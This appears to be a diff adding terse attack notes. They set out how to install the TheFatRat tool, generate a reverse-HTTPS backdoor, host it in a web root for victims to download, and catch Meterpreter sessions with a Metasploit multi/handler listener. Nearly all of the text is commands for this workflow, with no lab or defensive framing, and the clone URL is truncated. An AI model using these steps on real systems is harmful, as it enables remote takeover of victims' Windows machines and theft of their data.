@@ -1,0 +1,26 @@
+The Fatrat installation----->
+ gitclone https://github.com/Sc
+ls
+cd TheFatRat
+chmod +x setup.sh
+./setup.sh
+
+
+
+To create FatRat backdoor
+--> fatrat
+	use 6
+	use reverse_https_8080
+	generate
+	save it to the exact location and save it to www/html
+<-------> 
+to listen incoming connections
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost and lport
+show options
+save
+exploit'
+<-------------waiting for the incoming connections----------->
+
